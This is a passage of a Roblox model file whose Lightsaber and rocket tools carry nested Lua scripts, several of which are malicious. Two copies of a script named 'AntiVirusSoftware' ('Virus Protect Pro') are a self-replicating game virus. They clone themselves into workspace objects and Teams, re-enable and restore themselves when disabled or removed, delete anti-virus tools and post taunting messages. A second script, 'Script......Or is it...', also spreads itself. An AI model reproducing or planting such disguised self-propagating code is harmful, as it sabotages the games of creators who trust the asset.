								<string name="Name">ViVRuS</string>
								<Ref name="Part0">null</Ref>
								<Ref name="Part1">null</Ref>
								<bool name="archivable">true</bool>
							</Properties>
							<Item class="VelocityMotor" referent="RBX116">
								<Properties>
									<CoordinateFrame name="C0">
										<X>0</X>
										<Y>0</Y>
										<Z>0</Z>
										<R00>1</R00>
										<R01>0</R01>
										<R02>0</R02>
										<R10>0</R10>
										<R11>1</R11>
										<R12>0</R12>
										<R20>0</R20>
										<R21>0</R21>
										<R22>1</R22>
									</CoordinateFrame>
									<CoordinateFrame name="C1">
										<X>0</X>
										<Y>0</Y>
										<Z>0</Z>
										<R00>1</R00>
										<R01>0</R01>
										<R02>0</R02>
										<R10>0</R10>
										<R11>1</R11>
										<R12>0</R12>
										<R20>0</R20>
										<R21>0</R21>
										<R22>1</R22>
									</CoordinateFrame>
									<float name="CurrentAngle">0</float>
									<float name="DesiredAngle">0</float>
									<Ref name="Hole">null</Ref>
									<float name="MaxVelocity">0</float>
									<string name="Name">ViVRuS</string>
									<Ref name="Part0">null</Ref>
									<Ref name="Part1">null</Ref>
									<bool name="archivable">true</bool>
								</Properties>
								<Item class="Script" referent="RBX117">
									<Properties>
										<bool name="Disabled">false</bool>
										<Content name="LinkedSource"><null></null></Content>
										<string name="Name">AntiVirusSoftware</string>
										<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
										<bool name="archivable">true</bool>
									</Properties>
								</Item>
							</Item>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX118">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX119">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX120">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX121">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>0</Y>
					<Z>-1.5</Z>
					<R00>0</R00>
					<R01>0</R01>
					<R02>1</R02>
					<R10>1</R10>
					<R11>0</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>1</R21>
					<R22>0</R22>
				</CoordinateFrame>
				<string name="Name">Lightsaber</string>
				<Content name="TextureId"><binary>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</binary></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="LocalScript" referent="RBX122">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><url>http://www.roblox.com/asset/?id=1014476</url></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source"></ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX123">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">SwordScript</string>
					<ProtectedString name="Source">-------- OMG HAX

r = game:service(&quot;RunService&quot;)


local damage = 5


local slash_damage = 10
local lunge_damage = 30

sword = script.Parent.Handle
Tool = script.Parent


local SlashSound = Instance.new(&quot;Sound&quot;)
SlashSound.SoundId = &quot;29fd30da68440c59c95c4d6b8eb3ac69&quot;
SlashSound.Parent = sword
SlashSound.Volume = .7

local LungeSound = Instance.new(&quot;Sound&quot;)
LungeSound.SoundId = &quot;38f1aacb8e5c0a99d6b4d3881a5d7834&quot;
LungeSound.Parent = sword
LungeSound.Volume = .6

local UnsheathSound = Instance.new(&quot;Sound&quot;)
UnsheathSound.SoundId = &quot;5663efc7c9beb60fe83891f8e1bb8b2c&quot;
UnsheathSound.Parent = sword
UnsheathSound.Volume = 1



function blow(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)
	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)
	local hum = vCharacter:findFirstChild(&quot;Humanoid&quot;) -- non-nil if tool held by a character
	if humanoid~=nil and humanoid ~= hum and hum ~= nil then
		print(&quot;SWORD HIT&quot;)
		tagHumanoid(humanoid, vPlayer)
		humanoid:TakeDamage(damage)
		wait(1)
		untagHumanoid(humanoid)
	end
end


function tagHumanoid(humanoid, player)
	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = player
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = humanoid
end

function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end


function attack()
	damage = slash_damage
	SlashSound:play()
	local anim = Instance.new(&quot;StringValue&quot;)
	anim.Name = &quot;toolanim&quot;
	anim.Value = &quot;Slash&quot;
	anim.Parent = Tool
end

function lunge()
	damage = lunge_damage

	LungeSound:play()

	local anim = Instance.new(&quot;StringValue&quot;)
	anim.Name = &quot;toolanim&quot;
	anim.Value = &quot;Lunge&quot;
	anim.Parent = Tool
	
	
	force = Instance.new(&quot;BodyVelocity&quot;)
	force.velocity = Vector3.new(0,10,0) --Tool.Parent.Torso.CFrame.lookVector * 80
	force.Parent = Tool.Parent.Torso
	wait(.25)
	swordOut()
	wait(.25)
	force.Parent = nil
	wait(.5)
	swordUp()

	damage = slash_damage
end

function swordUp()
	Tool.GripForward = Vector3.new(-1,0,0)
	Tool.GripRight = Vector3.new(0,1,0)
	Tool.GripUp = Vector3.new(0,0,1)
end

function swordOut()
	Tool.GripForward = Vector3.new(0,0,1)
	Tool.GripRight = Vector3.new(0,-1,0)
	Tool.GripUp = Vector3.new(-1,0,0)
end

function swordAcross()
	-- parry
end


Tool.Enabled = true
local last_attack = 0
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	t = r.Stepped:wait()

	if (t - last_attack &lt; .2) then
		lunge()
	else
		attack()
	end

	last_attack = t

	--wait(.5)

	Tool.Enabled = true
end


function onEquipped()
	UnsheathSound:play()
end


script.Parent.Activated:connect(onActivated)
script.Parent.Equipped:connect(onEquipped)


connection = sword.Touched:connect(blow)


</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Geometry" referent="RBX124">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Timer" referent="RBX125">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Weld" referent="RBX126">
						<Properties>
							<CoordinateFrame name="C0">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<CoordinateFrame name="C1">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<string name="Name">ViVRuS</string>
							<Ref name="Part0">null</Ref>
							<Ref name="Part1">null</Ref>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX127">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX128">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX129">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX130">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX131">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>-0.850000024</Y>
					<Z>-1.29999995</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">rocket</string>
				<Content name="TextureId"><null></null></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Sound" referent="RBX132">
				<Properties>
					<bool name="Looped">false</bool>
					<string name="Name">Explosion</string>
					<float name="Pitch">1</float>
					<int name="PlayCount">0</int>
					<bool name="PlayOnRemove">false</bool>
					<Content name="SoundId"><url>rbxasset://sounds\collide.wav</url></Content>
					<float name="Volume">1</float>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Sound" referent="RBX133">
				<Properties>
					<bool name="Looped">true</bool>
					<string name="Name">Swoosh</string>
					<float name="Pitch">1</float>
					<int name="PlayCount">-1</int>
					<bool name="PlayOnRemove">false</bool>
					<Content name="SoundId"><url>http://www.roblox.com/asset/?id=12222095</url></Content>
					<float name="Volume">0.699999988</float>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX134">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">RocketScript</string>
					<ProtectedString name="Source">r = game:service(&quot;RunService&quot;)

shaft = script.Parent
position = shaft.Position

script.Parent.Explosion.PlayOnRemove = true -- play explosion sound when projectile removed from game

function fly()
	direction = shaft.CFrame.lookVector 
	position = position + direction * 5
	error = position - shaft.Position
	shaft.Velocity = 7*error
end

function blow()
	swoosh:stop()
	explosion = Instance.new(&quot;Explosion&quot;)
	explosion.BlastRadius = 12
	explosion.BlastPressure = 1000000 -- these are really wussy units
	explosion.Position = shaft.Position


	-- find instigator tag
	local creator = script.Parent:findFirstChild(&quot;creator&quot;)
	if creator ~= nil then
		explosion.Hit:connect(function(part, distance)  onPlayerBlownUp(part, distance, creator) end)
	end

	explosion.Parent = game.Workspace
	connection:disconnect()
	wait(.1)
	shaft:remove()
end

function onPlayerBlownUp(part, distance, creator)
	
	if part.Name == &quot;Head&quot; then
	
		local humanoid = part.Parent.Humanoid
		tagHumanoid(humanoid, creator)
	end
end

function tagHumanoid(humanoid, creator)
	-- tag does not need to expire iff all explosions lethal
	
	if creator ~= nil then
		local new_tag = creator:clone()
		new_tag.Parent = humanoid
		
	end
end

function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
		
			tag.Parent = nil
		end
	end
end

t, s = r.Stepped:wait()

swoosh = script.Parent.Swoosh
swoosh:play()

d = t + 10.0 - s
connection = shaft.Touched:connect(blow)

while t &lt; d do
	fly()
	t = r.Stepped:wait()
end

-- at max range
script.Parent.Explosion.PlayOnRemove = false
swoosh:stop()
shaft:remove()
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX135">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">LocalGui</string>
					<ProtectedString name="Source">local Tool = script.Parent;
local zoom = false
boom = nil

enabled = true

function onButton1Down(mouse)
	if zoom then
		controlling = true

		while true do
		wait()
		local engine = boom
		if engine == nil or engine.Parent == nil then return end
		local position = mouse.Hit
		local target = position.p
		move(target, engine)
		if controlling == false then break end
		wait(.1)
		end
	else
		if boom ~= nil then
			move(mouse.Hit.p, boom)
		end
	end
end

function onButton1Up(mouse)
	controlling = false
end

function move(target, engine)
	if engine.Parent == nil or target == nil then return end
	local origincframe = engine:findFirstChild(&quot;BodyGyro&quot;).cframe
	local dir = (target - engine.Position).unit
	local spawnPos = engine.Position

	local pos = spawnPos + (dir * 1)

	engine:findFirstChild(&quot;BodyGyro&quot;).maxTorque = Vector3.new(9000, 9000, 9000)
	engine:findFirstChild(&quot;BodyGyro&quot;).cframe = CFrame.new(pos,  pos + dir)
	wait(0.1)
	engine:findFirstChild(&quot;BodyGyro&quot;).maxTorque = Vector3.new(0, 0, 0)
	engine:findFirstChild(&quot;BodyGyro&quot;).cframe = origincframe
end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	mouse.Button1Up:connect(function() onButton1Up(mouse) end)
end

function onUnequippedLocal(mouse)
	if zoom then
		doZoom(boom)
	end
end

function doZoom(obj)
		if not zoom then
			zoom = true
			cam = workspace.CurrentCamera:Clone()
			cam.Parent = workspace
			workspace.CurrentCamera.CameraSubject = obj
			workspace.CurrentCamera.CameraType = &quot;Track&quot;
		else
			zoom = false
			workspace.CurrentCamera.CameraSubject = Tool.Parent
			workspace.CurrentCamera:Remove()
			workspace.CurrentCamera = cam
		end
end

Tool.Equipped:connect(onEquippedLocal)
Tool.Unequipped:connect(onUnequippedLocal)



local Rocket = Instance.new(&quot;Part&quot;)
local Tool = script.Parent

Rocket.Locked = true
Rocket.BackSurface = 0
Rocket.BottomSurface = 0
Rocket.FrontSurface = 0
Rocket.LeftSurface = 0
Rocket.RightSurface = 0
Rocket.TopSurface = 0
Rocket.formFactor = 0
Rocket.Size = Vector3.new(1,1,4)
Rocket.BrickColor = BrickColor.new(&quot;Dark stone grey&quot;)

Tool.RocketScript:clone().Parent = Rocket
Tool.Explosion:clone().Parent = Rocket
